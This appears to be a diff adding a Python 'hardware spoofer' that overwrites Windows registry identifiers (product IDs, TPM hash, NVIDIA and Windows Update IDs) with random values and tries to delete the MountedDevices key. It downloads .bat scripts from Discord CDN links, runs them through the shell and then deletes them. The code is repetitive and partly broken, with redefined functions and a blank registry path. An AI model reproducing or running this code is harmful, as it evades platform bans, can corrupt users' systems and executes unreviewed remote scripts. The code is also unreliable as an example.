+            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key, 0, winreg.KEY_SET_VALUE) as hkey:
+                winreg.SetValueEx(hkey, name, 0, winreg.REG_SZ, value)
+        except WindowsError:
+            pass
+    
+    def set_random_guid():
+
+        guid = f"{random.randint(10000, 99999)}"
+    
+        set_registry_value(r"SOFTWARE\Microsoft\Windows NT\CurrentVersion", "CurrentBuild", guid)
+
+    set_random_guid()
+    
+    def set_registry_value(key, name, value):
+        try:
+            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key, 0, winreg.KEY_SET_VALUE) as hkey:
+                winreg.SetValueEx(hkey, name, 0, winreg.REG_SZ, value)
+        except WindowsError:
+            pass
+    
+    def set_random_guid():
+
+        guid = f"{random.randint(10000, 99999)}"
+    
+        set_registry_value(r"SOFTWARE\Microsoft\Windows NT\CurrentVersion", "CurrentBuildNumber", guid)
+
+    set_random_guid()
+    
+    def set_registry_value(key, name, value):
+        try:
+            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key, 0, winreg.KEY_SET_VALUE) as hkey:
+                winreg.SetValueEx(hkey, name, 0, winreg.REG_SZ, value)
+        except WindowsError:
+            pass
+    
+    def set_random_guid():
+
+        guid = f"{random.randint(0, 9)}.{random.randint(0, 9)}"
+    
+        set_registry_value(r"SOFTWARE\Microsoft\Windows NT\CurrentVersion", "CurrentVersion", guid)
+
+    set_random_guid()
+    
+    def set_registry_value(key, name, value):
+        try:
+            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key, 0, winreg.KEY_SET_VALUE) as hkey:
+                winreg.SetValueEx(hkey, name, 0, winreg.REG_SZ, value)
+        except WindowsError:
+            pass
+    
+    def set_random_guid():
+
+        guid = "Professional"
+    
+        set_registry_value(r"SOFTWARE\Microsoft\Windows NT\CurrentVersion", "EditionID", guid)
+
+    set_random_guid()
+    
+    def set_registry_value(key, name, value):
+        try:
+            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key, 0, winreg.KEY_SET_VALUE) as hkey:
+                winreg.SetValueEx(hkey, name, 0, winreg.REG_SZ, value)
+        except WindowsError:
+            pass
+    
+    def set_random_guid():
+
+        guid = f"{random.randint(1000, 9999)}b{random.randint(10, 99)}e"
+    
+        set_registry_value(r"SOFTWARE\Microsoft\Windows NT\CurrentVersion", "InstallDate", guid)
+
+    set_random_guid()
+    
+    def set_registry_value(key, name, value):
+        try:
+            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key, 0, winreg.KEY_SET_VALUE) as hkey:
+                winreg.SetValueEx(hkey, name, 0, winreg.REG_SZ, value)
+        except WindowsError:
+            pass
+    
+    def set_random_guid():
+
+        guid = f"{random.randint(10000, 99999)}-{random.randint(100, 999)}-{random.randint(1000000, 9999999)}-{random.randint(10000, 99999)}"
+    
+        set_registry_value(r"SOFTWARE\Microsoft\Windows NT\CurrentVersion", "ProductId", guid)
+
+    set_random_guid()
+
+    def set_registry_value(key, name, value):
+        try:
+            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key, 0, winreg.KEY_SET_VALUE) as hkey:
+                winreg.SetValueEx(hkey, name, 0, winreg.REG_SZ, value)
+        except WindowsError:
+            pass
+    
+    def set_random_guid():
+
+        guid = "Windows 10 Pro"
+    
+        set_registry_value(r"SOFTWARE\Microsoft\Windows NT\CurrentVersion", "ProductName", guid)
+
+    set_random_guid()
+    
+    def set_registry_value(key, name, value):
+        try:
+            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key, 0, winreg.KEY_SET_VALUE) as hkey:
+                winreg.SetValueEx(hkey, name, 0, winreg.REG_QWORD, value)
+        except WindowsError:
+            pass
+
+    def set_random_guid():
+    
+        guid = random.randint(100000000000, 999999999999)
+    
+        set_registry_value(r"SOFTWARE\Microsoft\Windows NT\CurrentVersion", "InstallTime", guid)
+
+    set_random_guid()
+
+    def set_random_binary_value(key, value_name, length):
+        binary_value = bytearray(secrets.randbits(8) for _ in range(length))
+        try:
+            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key, 0, winreg.KEY_SET_VALUE) as hkey:
+                winreg.SetValueEx(hkey, value_name, 0, winreg.REG_BINARY, binary_value)
+        except WindowsError:
+            pass
+
+    set_random_binary_value(r"SOFTWARE\Microsoft\Windows NT\CurrentVersion", "DigitalProductId", length=164)
+
+    def set_random_binary_value(key, value_name, length):
+        binary_value = bytearray(secrets.randbits(8) for _ in range(length))
+        try:
+            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key, 0, winreg.KEY_SET_VALUE) as hkey:
+                winreg.SetValueEx(hkey, value_name, 0, winreg.REG_BINARY, binary_value)
+        except WindowsError:
+            pass
+
+    set_random_binary_value(r"SOFTWARE\Microsoft\Windows NT\CurrentVersion", "DigitalProductId4", length=1024)
+    
+    def set_registry_value(key, name, value):
+        try:
+            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key, 0, winreg.KEY_SET_VALUE) as hkey:
+                winreg.SetValueEx(hkey, name, 0, winreg.REG_QWORD, value)
+        except WindowsError:
+            pass
+
+    def set_random_guid():
+    
+        guid = random.randint(100000000000, 999999999999)
+    
+        set_registry_value(r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform\Activation", "ProductActivationTime", guid)
+
+    set_random_guid()
+    
+    ##Internet Explorer
+
+    def set_registry_value(key, name, value):
+        try:
+            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key, 0, winreg.KEY_SET_VALUE) as hkey:
+                winreg.SetValueEx(hkey, name, 0, winreg.REG_SZ, value)
+        except WindowsError:
+            pass
+    
+    def set_random_guid():
+
+        guid = f"KB{random.randint(1000000, 9999999)}"
+    
+        set_registry_value(r"SOFTWARE\Microsoft\Internet Explorer", "svcKBNumber", guid)
+
+    set_random_guid()
+
+    def set_registry_value(key, name, value):
+        try:
+            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key, 0, winreg.KEY_SET_VALUE) as hkey:
+                winreg.SetValueEx(hkey, name, 0, winreg.REG_SZ, value)
+        except WindowsError:
+            pass
+    
+    def set_random_guid():
+
+        guid = f"{random.randint(10000, 99999)}-{random.randint(100, 999)}-{random.randint(1000000, 9999999)}-{random.randint(10000, 99999)}"
+    
+        set_registry_value(r"SOFTWARE\Microsoft\Internet Explorer\Registration", "ProductId", guid)
+
+    set_random_guid()
+
+    def set_random_binary_value(key, value_name, length):
+        binary_value = bytearray(secrets.randbits(8) for _ in range(length))
+        try:
+            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key, 0, winreg.KEY_SET_VALUE) as hkey:
+                winreg.SetValueEx(hkey, value_name, 0, winreg.REG_BINARY, binary_value)
+        except WindowsError:
+            pass
+
+    set_random_binary_value(r"SOFTWARE\Microsoft\Internet Explorer\Migration", "IE Installed Date", length=8)
+    
+    ##WindowsUpdate
+    
+    def set_registry_value(key, name, value):
+        try:
+            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key, 0, winreg.KEY_SET_VALUE) as hkey:
+                winreg.SetValueEx(hkey, name, 0, winreg.REG_SZ, value)
+        except WindowsError:
+            pass
+    
+    def set_random_guid():
+
+        guid = f"{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000000, 999999999999)}"
+    
+        set_registry_value(r"SOFTWARE\Microsoft\Windows\CurrentVersion\WindowsUpdate", "SusClientId", guid)
+
+    set_random_guid()
+
+    def set_registry_value(key, name, value):
+        try:
+            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key, 0, winreg.KEY_SET_VALUE) as hkey:
+                winreg.SetValueEx(hkey, name, 0, winreg.REG_SZ, value)
+        except WindowsError:
+            pass
+
+    def set_random_guid():
+    
+        guid = f"{random.randint(10000, 99999)}-{random.randint(10000, 99999)}-{random.randint(1000, 9999)}-{random.randint(100000000, 999999999)}"
+    
+        set_registry_value(r"SOFTWARE\Microsoft\Windows\CurrentVersion\WindowsUpdate", "AccountDomainSid", guid)
+        set_registry_value(r"SOFTWARE\Microsoft\Windows\CurrentVersion\WindowsUpdate", "PingID", guid)
+    
+    set_random_guid()
+
+    def set_random_binary_value(key, value_name, length):
+        binary_value = bytearray(secrets.randbits(8) for _ in range(length))
+        try:
+            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key, 0, winreg.KEY_SET_VALUE) as hkey:
+                winreg.SetValueEx(hkey, value_name, 0, winreg.REG_BINARY, binary_value)
+        except WindowsError:
+            pass
+
+    set_random_binary_value(r"SOFTWARE\Microsoft\Windows\CurrentVersion\WindowsUpdate", "SusClientIdValidation", length=64)
+    
+    ##Control\SystemInformation
+    
+    def set_registry_value(key, name, value):
+        try:
+            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key, 0, winreg.KEY_SET_VALUE) as hkey:
+                winreg.SetValueEx(hkey, name, 0, winreg.REG_SZ, value)
+        except WindowsError:
+            pass
+
+    def set_random_guid():
+    
+        set_registry_value(r"SYSTEM\CurrentControlSet\Control\SystemInformation", "BIOSReleaseDate", BIOSReleaseDate)
+
+    set_random_guid()   
+
+    def set_registry_value(key, name, value):
+        try:
+            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key, 0, winreg.KEY_SET_VALUE) as hkey:
+                winreg.SetValueEx(hkey, name, 0, winreg.REG_SZ, value)
+        except WindowsError:
+            pass
+
+    def set_random_guid():
+    
+        set_registry_value(r"SYSTEM\CurrentControlSet\Control\SystemInformation", "BIOSVersion", biosversion)
+    
+    set_random_guid()
+    
+    def set_registry_value(key, name, value):
+        try:
+            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key, 0, winreg.KEY_SET_VALUE) as hkey:
+                winreg.SetValueEx(hkey, name, 0, winreg.REG_SZ, value)
+        except WindowsError:
+            pass
+
+    def set_random_guid():
+    
+        guid = f"{{{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000000, 999999999999)}}}"
+    
+        set_registry_value(r"SYSTEM\CurrentControlSet\Control\SystemInformation", "ComputerHardwareId", guid)
+
+    set_random_guid()
+    
+    def set_registry_value(key_path, name, value):
+        hkey = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, key_path)
+        winreg.SetValueEx(hkey, name, 0, winreg.REG_MULTI_SZ, value)
+        winreg.CloseKey(hkey)
+    
+    def set_random_guid():
+    
+        guid1 = f"{{{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000000, 999999999999)}}}"
+        guid2 = f"{{{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000000, 999999999999)}}}"
+        guid3 = f"{{{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000000, 999999999999)}}}"
+        guid4 = f"{{{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000000, 999999999999)}}}"
+        guid5 = f"{{{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000000, 999999999999)}}}"
+        guid6 = f"{{{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000000, 999999999999)}}}"
+        guid7 = f"{{{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000000, 999999999999)}}}"
+        guid8 = f"{{{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000000, 999999999999)}}}"
+        guid9 = f"{{{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000000, 999999999999)}}}"
+
+        set_registry_value(r"SYSTEM\CurrentControlSet\Control\SystemInformation", "ComputerHardwareIds", [guid1, guid2, guid3, guid4, guid5, guid6, guid7, guid8, guid9])
+   
+    set_random_guid()
+
+    def set_registry_value(key, name, value):
+        try:
+            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key, 0, winreg.KEY_SET_VALUE) as hkey:
+                winreg.SetValueEx(hkey, name, 0, winreg.REG_SZ, value)
+        except WindowsError:
+            pass
+
+    def set_random_guid():
+
+        guid = f"{random.randint(10000000000000, 99999999999999)}"
+
+        set_registry_value(r"SYSTEM\CurrentControlSet\Control\SystemInformation", "SystemManufacturer", guid)
+
+    set_random_guid()
+
+    def set_registry_value(key, name, value):
+        try:
+            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key, 0, winreg.KEY_SET_VALUE) as hkey:
+                winreg.SetValueEx(hkey, name, 0, winreg.REG_SZ, value)
+        except WindowsError:
+            pass
+
+    def set_random_guid():
+
+        guid = f"{random.randint(1000000000000, 9999999999999)}"
+
+        set_registry_value(r"SYSTEM\CurrentControlSet\Control\SystemInformation", "SystemProductName", guid)
+
+    set_random_guid()
+    
+    ##DELETE
+    
+    try:
+        registry = winreg.ConnectRegistry(None, winreg.HKEY_LOCAL_MACHINE)
+        key = winreg.OpenKey(registry, r"SYSTEM\MountedDevices", 0, winreg.KEY_ALL_ACCESS)
+        winreg.DeleteKey(registry, r"SYSTEM\MountedDevices, ")
+        winreg.CloseKey(key)
+        winreg.CloseKey(registry)
+    except WindowsError as e:
+        pass
+    
+    ##HardwareConfig
+    
+    def set_registry_value(key, name, value):
+        try:
+            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key, 0, winreg.KEY_SET_VALUE) as hkey:
+                winreg.SetValueEx(hkey, name, 0, winreg.REG_SZ, value)
+        except WindowsError:
+            pass
+
+    def set_random_guid():
+    
+        guid = f"{{{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000000, 999999999999)}}}"
+    
+        set_registry_value(r"SYSTEM\HardwareConfig", "LastConfig", guid)
+
+    set_random_guid()
+    
+    ##Global
+    
+    def set_registry_value(key, name, value):
+        try:
+            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key, 0, winreg.KEY_SET_VALUE) as hkey:
+                winreg.SetValueEx(hkey, name, 0, winreg.REG_SZ, value)
+        except WindowsError:
+            pass
+
+    def set_random_guid():
+    
+        guid = f"{{{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000000, 999999999999)}}}"
+    
+        set_registry_value(r"SOFTWARE\NVIDIA Corporation\Global", "ClientUUID", guid)
+
+    set_random_guid()
+
+    def set_registry_value(key, name, value):
+        try:
+            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key, 0, winreg.KEY_SET_VALUE) as hkey:
+                winreg.SetValueEx(hkey, name, 0, winreg.REG_SZ, value)
+        except WindowsError:
+            pass
+
+    def set_random_guid():
+    
+        guid = f"{random.randint(10000, 99999)}-{random.randint(10000, 99999)}-{random.randint(1000, 9999)}-{random.randint(100000000, 999999999)}"
+    
+        set_registry_value(r"SOFTWARE\NVIDIA Corporation\Global", "PersistenceIdentifier", guid)
+
+    set_random_guid()
+
+    def set_registry_value(key, name, value):
+        try:
+            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key, 0, winreg.KEY_SET_VALUE) as hkey:
+                winreg.SetValueEx(hkey, name, 0, winreg.REG_SZ, value)
+        except WindowsError:
+            pass
+
+    def set_random_guid():
+    
+        guid = f"{random.randint(1000000000000000, 9999999999999999)}"
+    
+        set_registry_value(r"SOFTWARE\NVIDIA Corporation\Global\CoProcManager", "ChipsetMatchID", guid)
+
+    set_random_guid()
+    
+    ##TPM
+
+    def set_random_binary_value(key, value_name, length):
+        binary_value = bytearray(secrets.randbits(8) for _ in range(length))
+        try:
+            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key, 0, winreg.KEY_SET_VALUE) as hkey:
+                winreg.SetValueEx(hkey, value_name, 0, winreg.REG_BINARY, binary_value)
+        except WindowsError:
+            pass
+
+    set_random_binary_value(r"SYSTEM\CurrentControlSet\Services\TPM\WMI", "WindowsAIKHash", length=24)
+    
+    ##Control\Class
+    
+    def set_registry_value(key, name, value):
+        try:
+            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key, 0, winreg.KEY_SET_VALUE) as hkey:
+                winreg.SetValueEx(hkey, name, 0, winreg.REG_SZ, value)
+        except WindowsError:
+            pass
+    
+    def set_random_guid():
+
+        guid = f"{{{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}}}-{random.randint(1000, 9999)}-{random.randint(100000000000, 999999999999)}"
+    
+        set_registry_value(r"SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000", "UserModeDriverGUID", guid)
+
+    set_random_guid()
+
+    def set_registry_value(key, name, value):
+        try:
+            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key, 0, winreg.KEY_SET_VALUE) as hkey:
+                winreg.SetValueEx(hkey, name, 0, winreg.REG_QWORD, value)
+        except WindowsError:
+            pass
+
+    def set_random_guid():
+    
+        guid = random.randint(100000000000, 999999999999)
+    
+        set_registry_value(r"SYSTEM\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\Configuration", "NetworkInterfaceInstallTimestamp", guid)
+
+    set_random_guid()
+
+    ##Diagnostics
+
+    def set_registry_value(key, name, value):
+        try:
+            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key, 0, winreg.KEY_SET_VALUE) as hkey:
+                winreg.SetValueEx(hkey, name, 0, winreg.REG_QWORD, value)
+        except WindowsError:
+            pass
+
+    def set_random_guid():
+    
+        guid = random.randint(100000000000000, 999999999999999)
+    
+        set_registry_value(r"   ", "LastEventlogWrittenTime", guid)
+
+    set_random_guid()
+
+    time.sleep(random.randint(1, 5))
+    
+    os.system('cls')
+
+    print(colorama.Fore.CYAN + colorama.Style.BRIGHT + """[+] Hardware Spoofed !
+[+] Disk Drive Spoofed !
+[+] Registery Spoofed !
+[+] Smbios Spoofed !
+[+] Nvidia Spoofed !
+[-] Spoofing Mac adress...""")
+
+    file_path_mac = os.path.expanduser("~") + "/AppData/Roaming/mac.bat"
+
+    if not os.path.exists(file_path_mac):
+        url = "https://cdn.discordapp.com/attachments/1000321583920988202/1064546309589172326/Mac.bat"
+        response = requests.get(url)
+        with open(file_path_mac, "wb") as f:
+            f.write(response.content)
+
+    subprocess.run(file_path_mac, shell=True)    
+
+    os.system('cls')
+     
+    if os.path.exists(file_path1):
+        os.remove(file_path1)
+
+    if os.path.exists(file_path2):
+        os.remove(file_path2)
+
+    if os.path.exists(file_path3):
+            os.remove(file_path3)
+
+    if os.path.exists(file_path4):
+        os.remove(file_path4)
+    
+    if os.path.exists(file_path_mac):
+        os.remove(file_path_mac)
+
+    os.system('cls')
+
+    print(colorama.Fore.CYAN + colorama.Style.BRIGHT + """[+] Hardware Spoofed !
+[+] Disk Drive Spoofed !
+[+] Registery Spoofed !
+[+] Smbios Spoofed !
+[+] Nvidia Spoofed !
+[+] Mac adress Spoofed !""")
+    
+    time.sleep(random.randint(1, 5))
+
+    os.system('cls')
+    
+    input(colorama.Fore.WHITE + colorama.Style.BRIGHT + "The spoofer has completed successfully !  press any key to exit :)")
+
+
+    
+if choix == "2":
+    
+    os.system('cls')
+    
+    file_path_cleaner34 = os.path.expanduser("~") + "/AppData/Roaming/cleaner34.bat"
+
+    if not os.path.exists(file_path_cleaner34):
+        url = "https://cdn.discordapp.com/attachments/1000321583920988202/1076471496022704168/cleaner34.bat"
+        response = requests.get(url)
+        with open(file_path_cleaner34, "wb") as f:
+            f.write(response.content)
+
+    subprocess.run(file_path_cleaner34, shell=True) 
+
+    if os.path.exists(file_path_cleaner34):
+        os.remove(file_path_cleaner34)
+    
+    os.system('cls')
+    
+    input(colorama.Fore.WHITE + colorama.Style.BRIGHT + "The cleaner has completed successfully !  press any key to exit :)")
+
+if choix == "3":
+    exit()
